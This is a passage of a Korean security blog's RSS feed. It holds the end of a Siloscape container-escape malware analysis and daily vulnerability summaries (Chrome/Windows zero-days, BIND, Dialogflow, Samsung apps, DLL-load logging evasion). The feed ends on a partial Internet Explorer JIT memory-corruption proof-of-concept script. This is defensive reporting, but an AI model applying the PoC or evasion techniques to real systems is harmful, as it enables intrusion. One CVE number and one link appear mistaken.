<code>CExecSvc.exe</code>에 DLL을 inject 하고 그 context에서 <code>NtSetInformationSymbolicLink</code>를 실행할 수 있다. 하지만 Siloscape는 기술 문서나 예시가 거의 없는 Thread Impersonation을 사용하였다. 이 기술의 주요한 함수는 문서화되지 않은 system call <code>NtImpersonateThread</code>이다.</p><p>Siloscape는 main thread를 impersonating 하여 <code>CExecSvc.exe</code>의 권한을 모방하고 컨테이너를 깨기 위해 새로 생성된 symbolic link에서 <code>NtSetInformationSymbolicLink</code>를 호출한다. 구체적으로 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결한다.</p><h1 id="클러스터-선택"><a href="#클러스터-선택" class="headerlink" title="클러스터 선택"></a>클러스터 선택</h1><p>호스트에 link를 생성한 뒤에 Kubernetes 노드에 존재하는 <code>kubectl.exe</code>와 Kubernetes 설정 파일을 찾는다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%204.png"></p><p>이름을 통해 <code>kubectl.exe</code>를 찾고 정규식을 사용해 Kubernetes 설정 파일을 찾는다. 검색하는 함수는 검색을 안 할 폴더 이름이 포함된 벡터의 포인터를 추가적인 인수로 사용한다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%205.png"></p><p>파일 검색을 위해 <code>FindFile</code>을 호출할 때 검색 속도를 빠르게 하기 위해 <code>Program Files</code>, <code>Program Files (x86)</code>, <code>Windows</code>, <code>Users</code> 폴더를 제외한다. (해당 폴더에 파일이 존재하지 않을 가능성이 높으므로) 두 파일을 모두 찾으면 전역 변수에 경로가 저장된다. 파일이 없으면 공격을 멈추고 siloscape가 종료된다.</p><p><code>kubectl</code>을 실행하는데 필요한 걸 모두 찾은 다음 <code>%ls auth can-i create deployments --kubeconfig=%ls</code> 명령어를 통해 손상된 노드가 악성 행위를 할 수 있는 권한이 있는지 확인한다. </p><h1 id="C2-연결-및-지원-명령어"><a href="#C2-연결-및-지원-명령어" class="headerlink" title="C2 연결 및 지원 명령어"></a>C2 연결 및 지원 명령어</h1><p>손상된 노드가 새로운 deployments를 생성할 수 있으면 호스트의 C 드라이브에 토르 아카이브와 unzip 바이너리를 추출한다. 토르를 추출한 후 <code>tor.exe</code>를 새 스레드로 시작하고 토르 스레드의 output을 확인할 때까지 대기한다.</p><p>토르가 실행되면 <code>.onion</code> 도메인을 통해 IRC 서버인 C2에 연결한다.</p><p>서버는 비밀번호로 보호되고 있고 command line argument와 바이트 XOR을 통해 복호화한다. C2 서버의 복호화 로직을 간단하게 표현하면 다음과 같다.</p><pre><code class="hljs angelscript">char hardCodedXor[<span class="hljs-number">32</span>] = <span class="hljs-string">&quot;HARD_CODED_32_LONG_STRING&quot;</span>;char ircPass[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)     ircPass[i] = hardCodedXor[i] ^ argv[<span class="hljs-number">1</span>][i];</code></pre><p>IRC 서버에 연결이 성공하면 <code>JOIN #WindowsKubernetes</code> 명령어를 사용하여 <code>WindowsKubernetes</code> IRC 채널에 들어간 후 대기한다.</p><p>Siloscape는 kubectl 지원 명령과 Windows <code>cmd</code> 명령 두 가지 유형의 명령이 있다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%206.png"></p><p>명령을 <code>admin</code> 사용자가 받으면 다음 로직을 따른다.</p><ul><li>메시지가 <code>K</code>로 시작하면 <code>%ls %s --kubeconfig=%ls</code> 명령을 실행하여 위에서 찾은 경로로 클러스터에 kubectl 명령 실행<ul><li>첫 번째 파라미터 : 전역 변수의 kubectl의 경로</li><li>두 번째 파라미터 : 첫번째 문자를 제외한 admin으로의 메시지</li><li>세 번째 파라미터 : 전역 변수의 설정 파일 경로</li></ul></li><li>메시지가 <code>C</code>로 시작하면 첫 번째 문자를 빼고 Windows cmd 명령을 실행</li></ul><h1 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h1><p>리소스 하이재킹이나 DoS를 목적으로 한 대부분의 클라우드 악성코드와 달리 Siloscape는 하나의 목적에만 국한되지 않고 다양한 악성 행위를 수행하기 위해 백도어를 설치한다.</p><p><a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">필자의 지난 게시글</a>에서 얘기했듯 마이크로소프트는 보안 기능으로 Windows container를 사용하지 말라고 했다. 마이크로소프트는 security boundary를 컨테이너화에 의존하지 말고 Hyper-V 컨테이너를 사용하는 걸 추천한다. Windows Server container에서 실행되는 모든 프로세스는 호스트의 관리자 권한을 가진 것으로 생각해야 하며 이번 경우에는 Kubernetes node였다. 보안이 필요한 Windows Server container에서 애플리케이션을 실행하는 경우 Hyper-V 컨테이너에서 실행하는 게 좋다.</p><p>게다가 관리자는 Kubernetes cluster를 안전하게 설정해야 한다. secured Kubernetes node의 권한은 해당 악성코드가 실행될 만큼의 충분한 권한이 없어서 Siloscape에 영향을 받지 않는다.</p><p>Siloscape는 container escape를 하지 못하면 피해를 유발하지 않는다는 점에서 컨테이너 보안의 중요성을 보여준다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/cloud/">cloud</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/containers/">containers</category>
      
      <category domain="https://hackyboiz.github.io/tags/kubernetes/">kubernetes</category>
      
      <category domain="https://hackyboiz.github.io/tags/siloscape/">siloscape</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Bypassing Image Load Kernel Callbacks</title>
      <link>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/</link>
      <guid>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/</guid>
      <pubDate>Sun, 20 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mdsec.co.uk/2021/06/bypassing-image-load-kern</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/">Bypassing Image Load Kernel Callbacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>프로그램에서 LoadLibrary 함수를 통해 DLL 파일을 로드하면 커널에서 등록한 Callback 함수에 의해 이벤트 로그에 해당 DLL이 로드되었다는 내용가 기록됩니다. LoadLibrary 함수를 분석해보면, 해당 이벤트는 내부 구조체들이 링크되는 과정이나 코드가 실행될 때 발생하는 것이 아니라 메모리에 할당하고 이를 셋업하는 과정에서 NtMapViewOfSection 함수에 의해 발생하는 것을 알 수 있습니다. 실제 LoadLibrary 함수를 똑같이 구현하되 NtMapViewOfSection 함수까지의 과정만 구현하고 실행할 경우, DLL이 로드되었다는 이벤트만 발생할 뿐, 실제로 DLL이 로드되지는 않습니다.</p><p>Dylan은 커널의 Callback 함수 호출을 우회하여 이벤트 로그의 발생 없이 DLL을 로드하는 방법과 이를 구현한 <a href="https://github.com/bats3c/DarkLoadLibrary">DarkLoadLibrary 소스코드</a>를 공개했습니다. 동작 과정은 아래와 같습니다.</p><ol><li>정상적인 PE 포맷을 가지고 있는지 확인</li><li>헤더와 섹션 데이터를 메모리에 복사 후 메모리 권한 설정</li><li>(필요하다면) 이미지 베이스 조정</li><li>import table과 delayed import table 세팅</li><li>TLS callback 실행</li><li>exception handler 등록</li><li>DllMain(Entry Point) 호출</li></ol><p>Dylan은 이 기법을 통해 악성코드가 어떤 DLL을 로드했는지에 대한 로그를 숨길 수 있고 이 기법이 Reflective DLL Injection을 대체할 것으로 예상하고 있다고 밝혔습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/loadimage/">loadimage</category>
      
      <category domain="https://hackyboiz.github.io/tags/event/">event</category>
      
      <category domain="https://hackyboiz.github.io/tags/darkloadlibrary/">darkloadlibrary</category>
      
      <category domain="https://hackyboiz.github.io/tags/callback/">callback</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PuzzleMaker: 실제 공격에 사용된 Exploit chain</title>
      <link>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/</link>
      <guid>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/</guid>
      <pubDate>Sat, 19 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securelist.com/puzzlemaker-chrome-zero-day-exploi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">PuzzleMaker attacks with Chrome zero-day exploit chain</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt;= 90.0.4430.85</p><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>최근 여러 기업에 대한 고도로 표적화된 공격이 감지되었습니다. Kaspersky technologies의 분석에 따르면 해당 공격들은 구글 Chrome(CVE-2021-21224)과 Windows(CVE-2021-31955, CVE-2021-31956) 제로데이 Exploit chain을 사용합니다.</p><ul><li><p>CVE-2021-21224</p><p>90.0.4430.85이전 Chrome의 V8에는 Type confusion 취약점이 존재해 해커로 하여금 악성 HTML 페이지를 통해 원격으로 임의 코드 실행을 할 수 있게 합니다.</p></li><li><p>CVE-2021-31955</p><p>ntoskrnl.exe에 존재하는 정보 노출 취약점입니다. Windows OS의 SuperFetch 기능을 악용한 것으로 <code>NtQuerySystemInformation</code>함수에 의해 반환된 SuperFetch 정보 클래스에 EPROCESS 커널 주소를 포함하기 때문에 발생합니다.</p></li><li><p>CVE-2021-3195</p><p>ntfs.sys에 존재하는 heap-based buffer overflow취약점입니다.<code> NTFSQUeryEaUserEaList</code>는 파일에 대한 확장 attribute 목록을 처리하고 버퍼에 저장합니다. 해당 기능은 output 버퍼의 크기를 제어할 수 있고 32비트 alignment로 정렬합니다. Output 버퍼의 패딩 기능에 integer underflow 검사가 없어서 Heap overflow가 발생합니다.</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] ISC BIND 서버의 정보 유출 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/</link>
      <guid>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/</guid>
      <pubDate>Fri, 18 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-5</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-502-an-information-disclosure-bug-in-isc-bind-server">ZDI-21-502: AN INFORMATION DISCLOSURE BUG IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIND 9.11.31, 9.16.15 이전 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ISC사의 DNS 서버 소프트웨어인 BIND에서 발견된 정보 유출 취약점의 세부 정보가 공개되었습니다.</p><p><code>der_match_tag_and_length()</code> 함수는 태그를 매칭하고 네트워크 패킷에서 길이와 같은 필드를 파싱하는 함수로, 취약점이 발생하는 코드는 아래와 같습니다.</p><pre><code class="hljs jsx"><span class="hljs-keyword">static</span> int der_match_tag_and_length(<span class="hljs-keyword">const</span> unsigned char *p, size_t len, Der_class xclass,                 Der_type type, int tag, size_t *length_ret,  size_t *size) &#123;     size_t l, ret = <span class="hljs-number">0</span>;     int e;      e = der_match_tag(p, len, xclass, type, tag, &amp;l);     <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125;     p += l;     len -= l;     ret += l;     e = der_get_length(p, len, length_ret, &amp;l);  <span class="hljs-comment">// (1) </span>    <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125; ...&#125;</code></pre><p>해당 함수에서 호출하는 <code>der_get_length()</code> 함수의 인자 중 <code>length_ret</code>은 호출자에서 값에 대한 검증이 이뤄져야 하지만 해당 함수에서는 검증을 하지 않고 반환합니다. <code>der_match_tag_and_length()</code> 함수에서 반환된 검증되지 않은 길이 값은 이후 <a href="https://datatracker.ietf.org/doc/html/rfc4178#section-4.2.1">negTokenInit</a>을 디코딩하는 <code>decode_NegTokenInit()</code> 함수 내의 여러 검사에 사용되어 OOB Access로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bounds/">out-of-bounds</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] dialogflow.cloud.google.com 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/</link>
      <guid>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/</guid>
      <pubDate>Thu, 17 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://lalka-test.medium.com/google-vrp-privilege-escala</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://lalka-test.medium.com/google-vrp-privilege-escalation-on-https-dialogflow-cloud-google-com-599af6c4516d">[Google VRP] Privilege escalation on https://dialogflow.cloud.google.com)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://dialogflow.cloud.google.com/">https://dialogflow.cloud.google.com/</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Cloud Platform의 Dialogflow 콘솔 사이트 <a href="https://dialogflow.cloud.google.com에서/">https://dialogflow.cloud.google.com에서</a> 권한 상승이 발견되었습니다. 해당 취약점은 초대된 다른 사용자의 권한을 낮춰도 동작하지 않아 발생하였습니다. 취약점을 트리거하는 단계는 다음과 같습니다.</p><ol><li><a href="https://dialogflow.cloud.google.com/#/editAgent/{project}/">https://dialogflow.cloud.google.com/#/editAgent/{project}/</a> 설정으로 이동하여 “Developer” 권한을 가진 사용자를 초대합니다.</li><li>“Developer”를 “Reviewer”로 권한을 낮춥니다.</li><li>설정이 적용되어 Reviewer로 화면에는 표시되지만 사용자는 Developer 권한으로 모든 작업이 가능합니다.</li></ol><p><a href="https://console.cloud.google.com/iam-admin/%EC%97%90%EC%84%9C">https://console.cloud.google.com/iam-admin/에서</a> 확인하면 초대된 사용자의 권한이 처음에 Developer로 설정한 후 Reviewer로 수정하면 권한이 수정되지 않고 Developer + Reviewer의 권한이 적용되어 발생한 취약점입니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/gcp/">gcp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Samsung mobile 기본 앱 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</link>
      <guid>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</guid>
      <pubDate>Wed, 16 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.oversecured.com/Two-weeks-of-securing-Samsun</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">Two weeks of securing Samsung devices: Part 1</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Samsung mobile 기본 앱</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oversecured 팀이 삼성 모바일 기기에 기본 제공되는 앱에서 다수의 취약점을 발견했습니다. 해커는 해당 취약점들을 악용해 타겟 기기의 연락처, 통화, SMS/MMS에 접근하여 편집하고 관리자 권한으로 임의의 앱을 설치할 수 있습니다.</p><ul><li><p>CVE-2021-25388</p><p>Knox Core는 URI 파라미터 검증이 미흡해 해커가 임의의 앱을 설치하거나 임의의 파일을 탈취할 수 있습니다. </p></li><li><p>CVE-2021-25356</p><p>Managed Provisioning은 모든 상호작용의 승인을 확인하기 위한 보안 검사가 있습니다. 하지만 <code>com.samsung.knox.container.requestId</code>값이 설정되어있다면 이를 무시할 수 있어 해커는 임의의 앱을 설치하고 관리자 권한을 부여할 수 있습니다.</p></li><li><p>CVE-2021-25391</p><p>Secure Folder는 Intent redirection 취약점이 있어 해커가 읽기, 쓰기 작업을 가로챌 수 있습니다.</p></li><li><p>CVE-2021-25393</p><p>SecSetting은 intent에 대한 부적절한 sanitization 때문에 해커가 system uid 데이터에 접근 할 수 있습니다.</p></li><li><p>CVE-2021-25392</p><p>Samsung Dex는 부적절한 백업 경로 설정 때문에 해커가 이를 변경해 크리티컬 데이터를 노출시킬 수 있습니다.</p></li><li><p>CVE-2021-25397</p><p>TelephonyUI의 부적절한 Access control 때문에 해커는 TelephonyUI의 파일에 대한 쓰기 작업을 할 수 있습니다.</p></li><li><p>CVE-2021-25390</p><p>PhotoTable의 Intent redirection 취약점은 해커가 임의의 파일에 접근할 수 있게 합니다.</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/pre-installed-app/">pre-installed app</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array</title>
      <link>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</link>
      <guid>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</guid>
      <pubDate>Tue, 15 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer (Windows 10)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS에서 지원을 2022년 6월에 완전히 종료하겠다고 밝힌 Internet Explorer에서 초기화되지 않은 배열 요소의 사용으로 인한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 jscript9의 PropertyID 배열의 처리 방식에 존재합니다. PropertyID 배열은 <code>ByteCodeGenerator::EmitScopeObjectInit</code> 함수에 할당됩니다. 이때 할당 시 메모리를 초기화하지 않는 <code>ArenaAllocator::Alloc</code> 함수를 사용해 배열을 할당하므로 배열의 일부가 초기화되지 않은 상태로 유지됩니다.</p><p>이러한 초기화되지 않은 PropertyID로 변수의 scope를 속일 수 있습니다. 이를 악용하면 정상적인 방법으로 액세스 할 수 없는 변수에 액세스 할 수 있으며 원격 코드 실행으로 이어질 수 있습니다. 해당 취약점은 <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>과 동일한 방법으로 JIT 엔진을 사용해 트리거할 수 있습니다.</p><p><strong>PoC Code</strong></p><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;start&#x27;</span>);</span><span class="javascript"><span class="hljs-comment">// prepare objects</span></span><span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span><span class="javascript"><span class="hljs-keyword">var</span> o = &#123;&#125;;</span><span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">    alert(<span class="hljs-string">&#x27;callback&#x27;</span>);</span><span class="javascript">    <span class="hljs-comment">// free </span></span><span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;worker.js&#x27;</span>);</span>    worker.postMessage(buf, [buf]);    worker.terminate();<span class="javascript">    worker = <span class="hljs-literal">null</span>;</span><span class="javascript">    <span class="hljs-comment">// sleep</span></span><span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span><span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;</span><span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span><span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>&#125;;<span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span><span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span><span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        &#x27;use strict&#x27;;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span><span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c04 = c03+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c05 = c04+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        let c06 = c05+1;\n&quot;</span> +  <span class="hljs-comment">// this variable will alias with Int16Array</span></span><span class="javascript"><span class="hljs-string">&quot;        const c07 = c06+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c08 = c07+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c09 = c08+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c10 = c09+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c11 = c10+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c12 = c11+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c13 = c12+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c14 = c13+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c15 = c14+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c16 = c15+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c17 = c16+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c18 = c17+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c19 = c18+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c20 = c19+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c21 = c20+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c22 = c21+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c23 = c22+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c24 = c23+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c25 = c24+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c26 = c25+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c27 = c26+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c28 = c27+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c29 = c28+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c30 = c29+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c31 = c30+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c32 = c31+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c33 = c32+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c34 = c33+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c35 = c34+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        if(crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span><span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span><span class="javascript"><span class="hljs-string">&quot;        &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&#x27;s an integer</span></span><span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) &#123;\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span><span 